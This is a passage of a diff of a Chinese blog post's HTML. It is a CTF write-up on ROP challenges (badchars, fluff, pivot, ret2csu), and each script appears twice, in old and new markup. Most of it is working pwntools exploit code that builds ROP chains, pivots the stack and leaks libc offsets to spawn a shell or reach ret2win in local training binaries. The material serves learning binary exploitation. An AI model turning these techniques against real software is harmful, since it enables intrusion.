+payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00'</span>,bss,key1,key3,bss,key4,<span class="hljs-number">0x98</span>,key5,sys,<span class="hljs-number">0xdeadbeef</span>,bss])
+raw_input(<span class="hljs-string">"-&gt;"</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./badchars&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./badchars&#39;)
-offset = 40
-bss = 0x6010B0
-key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; ret
-key2 = 0x0000000000400b3b# pop r12 ; pop r13 ; ret
-key3 = 0x0000000000400b39#pop rdi ; ret
-key4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; ret
-key5 = 0x0000000000400b40#pop r14 ; pop r15 ; ret
-system = 0x004006F0
-payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])
-raw_input(&#39;-&gt;&#39;)
+io.interactive()</code></pre></div>
+
+<h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./badchars'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./badchars'</span>)
+offset = <span class="hljs-number">40</span>
+bss = <span class="hljs-number">0x6010B0</span>
+key1 = <span class="hljs-number">0x0000000000400b34</span><span class="hljs-comment"># mov qword ptr [r13], r12 ; ret</span>
+key2 = <span class="hljs-number">0x0000000000400b3b</span><span class="hljs-comment"># pop r12 ; pop r13 ; ret</span>
+key3 = <span class="hljs-number">0x0000000000400b39</span><span class="hljs-comment">#pop rdi ; ret</span>
+key4 = <span class="hljs-number">0x0000000000400b30</span><span class="hljs-comment">#xor byte ptr [r15], r14b ; ret</span>
+key5 = <span class="hljs-number">0x0000000000400b40</span><span class="hljs-comment">#pop r14 ; pop r15 ; ret</span>
+system = <span class="hljs-number">0x004006F0</span>
+payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00\x00\x00\x00\x00'</span>,bss,key1,key5,<span class="hljs-number">0x98</span>,bss,key4,key3,bss,system])
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p>
-<pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p>
-<pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>这样找出足够的gadget，以便自己试用。</p>
-<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./fluff32&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./fluff32&#39;)
-key1 = 0x080483e1# pop ebx ; ret
-key2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
-key3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
-bss = 0x804A06C
-key4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
-key5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
-sys = 0x8048430
-offset = 44
-payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])
-raw_input(&quot;-&gt;&quot;)
+<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span>], <span class="hljs-built_in">edx</span> <span class="hljs-comment">; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span></code></pre></div>
+
+<p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p>
+<div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./fluff</span> <span class="hljs-params">--depth</span> 15</code></pre></div>
+
+<p>这样找出足够的gadget，以便自己试用。</p>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./fluff32'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./fluff32'</span>)
+key1 = <span class="hljs-number">0x080483e1</span><span class="hljs-comment"># pop ebx ; ret</span>
+key2 = <span class="hljs-number">0x08048671</span><span class="hljs-comment"># xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret</span>
+key3 = <span class="hljs-number">0x0804867b</span><span class="hljs-comment"># xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret</span>
+bss = <span class="hljs-number">0x804A06C</span>
+key4 = <span class="hljs-number">0x08048689</span><span class="hljs-comment">#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret</span>
+key5 = <span class="hljs-number">0x08048693</span><span class="hljs-comment"># mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span>
+sys = <span class="hljs-number">0x8048430</span>
+offset = <span class="hljs-number">44</span>
+payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'sh\x00\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,sys,<span class="hljs-number">0xdeadbeef</span>,bss])
+raw_input(<span class="hljs-string">"-&gt;"</span>)
 io.sendline(payload)
-io.interactive()
-</code></pre>
-<h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./fluff&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./fluff&#39;)
-key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; ret
-key2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
-key3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
-bss = 0x601090
-key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
-key5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
-key6 = 0x00000000004008c3# pop rdi ; ret
-sys = 0x4005E0
-offset = 40
-payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])
-raw_input(&quot;-&gt;&quot;)
+io.interactive()</code></pre></div>
+
+<h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./fluff'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./fluff'</span>)
+key1 = <span class="hljs-number">0x0000000000400832</span><span class="hljs-comment"># pop r12 ; mov r13d, 0x604060 ; ret</span>
+key2 = <span class="hljs-number">0x0000000000400822</span><span class="hljs-comment">#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span>
+key3 = <span class="hljs-number">0x000000000040082f</span><span class="hljs-comment">#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span>
+bss = <span class="hljs-number">0x601090</span>
+key4 = <span class="hljs-number">0x0000000000400840</span><span class="hljs-comment">##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span>
+key5 = <span class="hljs-number">0x000000000040084e</span><span class="hljs-comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span>
+key6 = <span class="hljs-number">0x00000000004008c3</span><span class="hljs-comment"># pop rdi ; ret</span>
+sys = <span class="hljs-number">0x4005E0</span>
+offset = <span class="hljs-number">40</span>
+payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'/bin/sh\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,key6,bss,sys])
+raw_input(<span class="hljs-string">"-&gt;"</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p>
 <h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p>
 <p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p>
-<pre><code class="c">void __noreturn ret2win()
-{
-  system(&quot;/bin/cat flag.txt&quot;);
-  exit(0);
-}</code></pre>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">ret2win</span><span class="hljs-params">()</span>
+</span>&#123;
+  system(<span class="hljs-string">"/bin/cat flag.txt"</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;</code></pre></div>
+
 <p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p>
 <ul>
 <li>leak <code>foothold_function_got</code></li>
@@ -379,179 +445,204 @@ io.interactive()</code></pre>
 <li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li>
 </ul>
 <p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p>
-<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-context.log_level = &#39;debug&#39;
-io = process(&#39;./pivot32&#39;)
-elf = ELF(&#39;./pivot32&#39;)
-libc = ELF(&#39;./libpivot32.so&#39;)
-foothold_function_plt = elf.plt[&#39;foothold_function&#39;]
-foothold_function_got = elf.got[&#39;foothold_function&#39;]
-put_plt = elf.plt[&#39;puts&#39;]
-key1 = 0x080486a8 #: leave ; ret
-io.recvuntil(&#39;0x&#39;)
-leak = int(io.recv(8),16)
-print(&#39;leak_stack&#39;+ hex(leak))
-io.recvuntil(&#39;now and it will land there&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])
-raw_input(&#39;-&gt;&#39;)
+<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./pivot32'</span>)
+elf = ELF(<span class="hljs-string">'./pivot32'</span>)
+libc = ELF(<span class="hljs-string">'./libpivot32.so'</span>)
+foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]
+foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]
+put_plt = elf.plt[<span class="hljs-string">'puts'</span>]
+key1 = <span class="hljs-number">0x080486a8</span> <span class="hljs-comment">#: leave ; ret</span>
+io.recvuntil(<span class="hljs-string">'0x'</span>)
+leak = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)
+print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))
+io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = flat([<span class="hljs-number">0xdeadbeef</span>,foothold_function_plt,put_plt,<span class="hljs-number">0x08048640</span>,foothold_function_got])
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.recvuntil(&#39;stack smash&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)
+io.recvuntil(<span class="hljs-string">'stack smash'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p32(leak) +p32(key1)
 io.sendline(payload)
-io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)
-leak = u32(io.recv(4))
-print(&#39;leak&#39;+ hex(leak))
-ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]
-io.recvuntil(&#39;now and it will land there&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-io.sendline(&#39;1&#39;)
-io.recvuntil(&#39;send your stack smash&#39;)
-payload = &#39;a&#39; * 44 + p32(ret2win)
+io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)
+leak = u32(io.recv(<span class="hljs-number">4</span>))
+print(<span class="hljs-string">'leak'</span>+ hex(leak))
+ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]
+io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+io.sendline(<span class="hljs-string">'1'</span>)
+io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)
+payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(ret2win)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-io = process(&#39;./pivot&#39;)
-elf = ELF(&#39;./pivot&#39;)
-libc = ELF(&#39;./libpivot.so&#39;)
-foothold_function_plt = elf.plt[&#39;foothold_function&#39;]
-foothold_function_got = elf.got[&#39;foothold_function&#39;]
-offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]
-put_plt = elf.plt[&#39;puts&#39;]
-key1 = 0x0000000000400a39 #: leave ; ret
-key2 = 0x0000000000400b73#pop rdi ; ret
-key3 = 0x0000000000400b02#xchg rax, rsp ; ret
-key4 = 0x0000000000400b00#pop rax ; ret
-print(&#39;offset:&#39; + hex(offset))
-io.recvuntil(&#39;0x&#39;)
-leak = int(io.recv(12),16)
-print(&#39;leak_stack&#39;+ hex(leak))
-io.recvuntil(&#39;now and it will land there&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])
-raw_input(&#39;-&gt;&#39;)
+io.interactive()</code></pre></div>
+
+<h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./pivot'</span>)
+elf = ELF(<span class="hljs-string">'./pivot'</span>)
+libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)
+foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]
+foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]
+offset = libc.symbols[<span class="hljs-string">'foothold_function'</span>] - libc.symbols[<span class="hljs-string">'ret2win'</span>]
+put_plt = elf.plt[<span class="hljs-string">'puts'</span>]
+key1 = <span class="hljs-number">0x0000000000400a39</span> <span class="hljs-comment">#: leave ; ret</span>
+key2 = <span class="hljs-number">0x0000000000400b73</span><span class="hljs-comment">#pop rdi ; ret</span>
+key3 = <span class="hljs-number">0x0000000000400b02</span><span class="hljs-comment">#xchg rax, rsp ; ret</span>
+key4 = <span class="hljs-number">0x0000000000400b00</span><span class="hljs-comment">#pop rax ; ret</span>
+print(<span class="hljs-string">'offset:'</span> + hex(offset))
+io.recvuntil(<span class="hljs-string">'0x'</span>)
+leak = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)
+print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))
+io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,<span class="hljs-number">0x004008A0</span>])
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.recvuntil(&#39;stack smash&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)
+io.recvuntil(<span class="hljs-string">'stack smash'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p64(key4)+ p64(leak) + p64(key3)
 io.sendline(payload)
-io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)
-leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))
-print(&#39;leak&#39;+ hex(leak))
-ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]
-print(&#39;ret2win&#39;+ hex(ret2win))
-# raw_input(&#39;-&gt;&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = &#39;a&#39; * 40 + p64(ret2win)
+io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)
+leak = int(u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)))
+print(<span class="hljs-string">'leak'</span>+ hex(leak))
+ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]
+print(<span class="hljs-string">'ret2win'</span>+ hex(ret2win))
+<span class="hljs-comment"># raw_input('-&gt;')</span>
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(ret2win)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p>
-<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-context.log_level = &#39;debug&#39;
-io = process(&#39;./pivot32&#39;)
-elf = ELF(&#39;./pivot32&#39;)
-offset = 44
-io.recvuntil(&#39;0x&#39;)
-leak1 = int(io.recv(8),16) + 1921272 + 0x000000967
-print(&#39;leak&#39;+ hex(leak1))
-raw_input(&#39;-&gt;&#39;)
-payload = offset * &#39;a&#39; + p32(leak1)
-io.sendline(&#39;1&#39;)
-io.recvuntil(&#39;send your stack smash&#39;)
+<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./pivot32'</span>)
+elf = ELF(<span class="hljs-string">'./pivot32'</span>)
+offset = <span class="hljs-number">44</span>
+io.recvuntil(<span class="hljs-string">'0x'</span>)
+leak1 = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">1921272</span> + <span class="hljs-number">0x000000967</span>
+print(<span class="hljs-string">'leak'</span>+ hex(leak1))
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+payload = offset * <span class="hljs-string">'a'</span> + p32(leak1)
+io.sendline(<span class="hljs-string">'1'</span>)
+io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-io = process(&#39;./pivot&#39;)
-elf = ELF(&#39;./pivot&#39;)
-libc = ELF(&#39;./libpivot.so&#39;)
-offset = 40
-io.recvuntil(&#39;0x&#39;)
-leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]
-raw_input(&#39;-&gt;&#39;)
-payload = offset * &#39;a&#39; + p64(leak1)
-io.sendline(&#39;1&#39;)
-io.recvuntil(&#39;send your stack smash&#39;)
+io.interactive()</code></pre></div>
+
+<h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./pivot'</span>)
+elf = ELF(<span class="hljs-string">'./pivot'</span>)
+libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)
+offset = <span class="hljs-number">40</span>
+io.recvuntil(<span class="hljs-string">'0x'</span>)
+leak1 = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">3977456</span> + libc.symbols[<span class="hljs-string">'ret2win'</span>]
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+payload = offset * <span class="hljs-string">'a'</span> + p64(leak1)
+io.sendline(<span class="hljs-string">'1'</span>)
+io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p>
 <ul>
 <li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li>
 <li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li>
 </ul>
 <p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p>
-<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-io = process(&#39;./ret2csu&#39;)
-elf = ELF(&#39;./ret2csu&#39;)
-offset = 40
-io.recvuntil(&#39;&gt;&#39;)
-key1 = 0x040089A
-key2 = 0x000400880
-key3 = 0x0000600E38
-raw_input(&#39;-&gt;&#39;)
-payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./ret2csu'</span>)
+elf = ELF(<span class="hljs-string">'./ret2csu'</span>)
+offset = <span class="hljs-number">40</span>
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+key1 = <span class="hljs-number">0x040089A</span>
+key2 = <span class="hljs-number">0x000400880</span>
+key3 = <span class="hljs-number">0x0000600E38</span>
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+payload = offset * <span class="hljs-string">'a'</span> + flat([key1,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,key3,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xdeadcafebabebeef</span>,key2,<span class="hljs-number">7</span>*<span class="hljs-number">8</span>*<span class="hljs-string">'a'</span>,<span class="hljs-number">0x000004007B1</span>])
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
 
+
+            </div>
             <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
-                  <a class="hover-with-bg" href="/tags/wp">wp</a>
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </div>
                 
-              </span>
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/20/pwntools的gdb.attach/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwntools的gdb.attach</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/08/linux_ Lamp搭建记录/">
+                        <span class="hidden-mobile">linux- Lamp搭建记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
             
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
+          </article>
         </div>
       </div>
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
